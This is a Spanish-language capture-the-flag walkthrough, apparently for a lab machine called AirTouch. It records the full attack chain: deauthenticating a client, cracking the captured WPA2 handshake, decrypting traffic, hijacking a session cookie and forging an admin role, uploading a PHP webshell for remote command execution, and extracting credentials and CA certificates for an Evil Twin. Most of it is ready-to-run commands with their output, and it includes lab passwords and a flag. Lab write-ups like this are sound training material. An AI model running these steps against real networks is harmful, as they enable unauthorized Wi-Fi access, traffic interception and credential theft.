Fases 1 & 2 — Handshake WPA2 y Descifrado de Tráfico

📡 Captura del Handshake WPA2-PSK

wlan0mon (monitor, phy0) se usa para captura pasiva. wlan1 (managed, phy1) se usa para inyección de frames de deauthenticación, ya que está en la misma red y puede inyectar frames 802.11.

💻 Terminal 1 — Captura dirigida al AP objetivo
# Verificar estado de wlan0mon (debe estar en modo monitor) iw dev wlan0mon info # Interface wlan0mon type monitor wiphy 0 channel 6 # Captura dirigida: solo BSSID F0:9F:C2:A3:F1:A7, canal 6 airodump-ng --bssid F0:9F:C2:A3:F1:A7 --channel 6 \ -w /tmp/fresh --output-format cap wlan0mon # Salida en tiempo real: # CH 6 ][ Elapsed: 0 s ][ WPA handshake: (vacío aún) # BSSID PWR RXQ Beacons #Data CH ESSID # F0:9F:C2:A3:F1:A7 -28 90 115 4 6 AirTouch-Internet # STATION PWR Rate Lost Frames Probe # 28:6C:07:FE:A3:22 -29 54e 0 12
💻 Terminal 2 — Deauth para forzar reconexión del cliente
# Enviar 10 frames de deauthenticación al broadcast del AP # --ignore-negative-one: ignorar error de canal negativo (mac80211_hwsim) aireplay-ng --ignore-negative-one -0 10 \ -a F0:9F:C2:A3:F1:A7 \ -c 28:6C:07:FE:A3:22 wlan1 # Salida: # Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [0|0 ACKs] # En Terminal 1 aparece inmediatamente: # CH 6 ][ WPA handshake: F0:9F:C2:A3:F1:A7 <-- ¡CAPTURADO!
💻 Verificación y crackeo del handshake
# Verificar handshake capturado aircrack-ng /tmp/fresh-01.cap # Index BSSID ESSID Encryption # 1 F0:9F:C2:A3:F1:A7 AirTouch-Internet WPA (1 handshake) # Crackeo con wordlist rockyou.txt aircrack-ng -w /root/eaphammer/wordlists/rockyou.txt \ -b F0:9F:C2:A3:F1:A7 /tmp/fresh-01.cap # Resultado (aprox 30 segundos): # Aircrack-ng 1.6 # [00:00:30] 245000 keys tested (8166.67 k/s) # KEY FOUND! [ challenge ] # Master Key : 3C 45 A1 F2 ... (32 bytes) # Transient Key : 78 0A BA 43 ... (64 bytes)

🔓 Descifrado de Tráfico HTTP con airdecap-ng

Con la PSK conocida (challenge), airdecap-ng puede descifrar todos los frames WPA2 capturados. El cliente simulado navega periódicamente por el router 192.168.3.1, dejando su sesión HTTP en el tráfico.

💻 Captura de tráfico del cliente + descifrado
# 1. Conectar wlan1 a AirTouch-Internet wpa_passphrase "AirTouch-Internet" "challenge" > /tmp/internet.conf wpa_supplicant -B -i wlan1 -c /tmp/internet.conf # Successfully initialized wpa_supplicant dhclient wlan1 ip addr show wlan1 # inet 192.168.3.100/24 brd 192.168.3.255 scope global dynamic wlan1 # 2. Capturar tráfico completo del canal durante ~3 minutos airodump-ng --bssid F0:9F:C2:A3:F1:A7 --channel 6 \ -w /tmp/fresh --output-format cap wlan0mon & # 3. Descifrar la captura con la PSK crackeada airdecap-ng -e "AirTouch-Internet" -p "challenge" /tmp/fresh-01.cap # Total number of packets read 3904 # Total number of WEP data packets 0 # Total number of WPA data packets 215 # Number of packets with bad TKIP MIC 0 # Number of decrypted WPA packets 34 # Output: /tmp/fresh-01-dec.cap
💻 Extracción de cookies de sesión HTTP
# Buscar cookies PHP en el tráfico descifrado strings /tmp/fresh-01-dec.cap | grep -i "cookie\|PHPSESSID\|UserRole" # Cookie: PHPSESSID=0545q2iqf5beqnd5jec9qqboc1; UserRole=user # El cliente navega como "user" — necesitamos admin # Extraer también tráfico HTTP completo para ver estructura de la app strings /tmp/fresh-01-dec.cap | grep -i "POST\|GET\|HTTP\|login\|upload" # GET /login.php HTTP/1.1 # POST /login.php HTTP/1.1 # GET /dashboard.php HTTP/1.1 # La sesión es válida pero con UserRole=user # Reutilizamos el PHPSESSID pero cambiamos UserRole=admin en el navegador # O directamente con curl: curl -b "PHPSESSID=0545q2iqf5beqnd5jec9qqboc1;UserRole=admin" \ "http://127.0.0.1:4444/index.php" | grep -i "upload\|file" # <form enctype="multipart/form-data" action="index.php" method="POST"> # <input type="file" name="fileToUpload">
💡
Alternativa con Wireshark: Abrir fresh-01.cap en Wireshark → Edit → Preferences → Protocols → IEEE 802.11 → Decryption Keys → añadir tipo wpa-pwd con valor challenge:AirTouch-Internet. Luego filtrar por http y buscar el POST de login con las cookies en "HTML Form URL Encoded".

Fases 3 & 4 — Explotación del Router + User Flag

🌐 Tunnel SSH y Enumeración del Router

El router solo es accesible desde la red 192.168.3.0/24 (a la que accedemos via wlan1). Para operar desde Kali, se establece un túnel SSH a través de la máquina consultor.

💻 Desde Kali — tunnel SSH al puerto 80 del router
# Túnel: localhost:4444 → 192.168.3.1:80 via consultant sshpass -p 'RxBlZhLmOkacNWScmZ6D' ssh -f -N -L 4444:192.168.3.1:80 \ consultant@10.129.3.94 # Verificar acceso al router curl -s http://127.0.0.1:4444/login.php | head -5 # <!DOCTYPE html> # <title>AirTouch Router — Login</title> # Escanear puertos del router desde la red interna nmap -sV -p 22,80,443,8080 192.168.3.1 # 22/tcp open ssh OpenSSH 8.2p1 # 80/tcp open http Apache httpd 2.4.41

🔼 File Upload sin restricción → Webshell RCE

La aplicación web solo verifica la cookie UserRole=admin para mostrar el formulario de upload. No valida la extensión del archivo subido, permitiendo subir archivos .phtml que PHP ejecuta como código.

💻 Crear webshell y subir al router
# 1. Crear webshell PHP con extensión .phtml (ejecutable por Apache) echo '<?php system($_GET["c"]); ?>' > /tmp/shell.phtml # 2. Subir el webshell usando la cookie de admin curl -b "PHPSESSID=0545q2iqf5beqnd5jec9qqboc1;UserRole=admin" \ -F "fileToUpload=@/tmp/shell.phtml" \ -F "submit=Subir archivo" \ http://127.0.0.1:4444/index.php # File uploaded successfully. # Archivo almacenado en: /var/www/html/uploads/shell.phtml # 3. Verificar RCE curl -b "PHPSESSID=0545q2iqf5beqnd5jec9qqboc1;UserRole=admin" \ "http://127.0.0.1:4444/uploads/shell.phtml?c=id" # uid=33(www-data) gid=33(www-data) groups=33(www-data) # 4. Leer archivos del sistema con file reader echo '<?php echo file_get_contents($_GET["file"]); ?>' > /tmp/reader.phtml # (Subir del mismo modo) # 5. Leer credenciales hardcodeadas en login.php curl -b "PHPSESSID=0545q2iqf5beqnd5jec9qqboc1;UserRole=admin" \ "http://127.0.0.1:4444/uploads/reader.phtml?file=/var/www/html/login.php"

🏳️ User Flag + Extracción de Certificados SSL

Con las credenciales SSH del router, obtenemos acceso interactivo via otro túnel SSH. En /root encontramos la user flag, el script send_certs.sh con credenciales del servidor remoto, y los certificados CA de AirTouch imprescindibles para el Evil Twin.

💻 SSH al router + user flag + certs
# Abrir tunnel SSH al puerto 22 del router sshpass -p 'RxBlZhLmOkacNWScmZ6D' ssh -f -N -L 2222:192.168.3.1:22 \ consultant@10.129.3.94 # Entrar al router como user sshpass -p 'JunDRDZKHDnpkpDDvay' ssh -p 2222 user@localhost sudo -i # user tiene sudo sin contraseña # User Flag cat usuario.txt # 3409777db07f2c8da0f3bdf40fcf0890 # Descubrir credenciales del servidor remoto 10.10.10.1 cat /root/send_certs.sh #!/bin/bash REMOTE_USER="remote" REMOTE_PASSWORD="xGgWEwqUpfoOVsLeROeG" REMOTE_HOST="10.10.10.1" LOCAL_FOLDER="/root/certs-backup" REMOTE_PATH="/tmp/certs" sshpass -p "$REMOTE_PASSWORD" scp -r "$LOCAL_FOLDER" "$REMOTE_USER@10.10.10.1:$REMOTE_PATH" # Certificados SSL de AirTouch (necesarios para Evil Twin válido) ls /root/certs-backup/ # ca.crt ca.conf server.crt server.csr server.conf server.ext server.key # Copiar certs a la máquina consultor (via base64 para evitar problemas de SCP) # En la máquina consultor, como root: ./eaphammer --cert-wizard import \ --server-cert server.crt \ --ca-cert ca.crt \ --private-key server.key # [*] Certs imported to /root/eaphammer/certs/active/fullchain.pem
🔑
ca.crt — CA raíz AirTouch
Certificado de la Autoridad Certificadora interna de AirTouch. Los clientes WiFi confían en esta CA para validar servidores EAP. Con él, nuestro Evil Twin presentará un certificado válido y los clientes no detectarán la suplantación.
📜
server.crt + server.key
Certificado de servidor y clave privada firmados por la CA de AirTouch. EAPHammer los usa para presentar un certificado TLS legítimo durante el handshake PEAP, lo que hace que los clientes completen la autenticación EAP.

Fase 5 — Evil Twin WPA2-Enterprise (AirTouch-Office)

🔬 Diagnóstico — ¿Por qué fallan los primeros intentos?

Durante la resolución se probaron varias configuraciones incorrectas antes de encontrar la solución. Es importante entender cada error.

⚠️
Error 1 — Canal incorrecto (6 en lugar de 44): El primer intento usó canal 6 porque el escaneo inicial con wlan0mon (solo 2.4GHz) no reveló los APs de 5GHz. Los clientes probeaban nuestra AP en canal 6 pero NO autenticaban porque estaban conectados a los APs reales en canal 44. Solución: airodump-ng --band abg para escanear también 5GHz.
⚠️
Error 2 — Colisión de BSSID: Al usar -b AC:8B:A9:AA:3F:D2 (mismo BSSID que el AP real), los clientes SÍ se asociaban pero los frames EAPOL-Response iban al AP real en el otro contenedor. Síntoma: TX status ack=1 (el cliente recibe nuestra petición EAP) pero nunca llega la respuesta. Solo CTRL-EVENT-EAP-RETRANSMIT y timeout.
⚠️
Error 3 — Usar wlan4mon (monitor) como interfaz AP: El writeup referencia wlan4mon pero EAPHammer requiere una interfaz en modo managed para convertirla a AP. wlan4mon al estar en monitor mode causa nl80211 driver initialization failed. Usar wlan5 o wlan6 (managed) en su lugar.
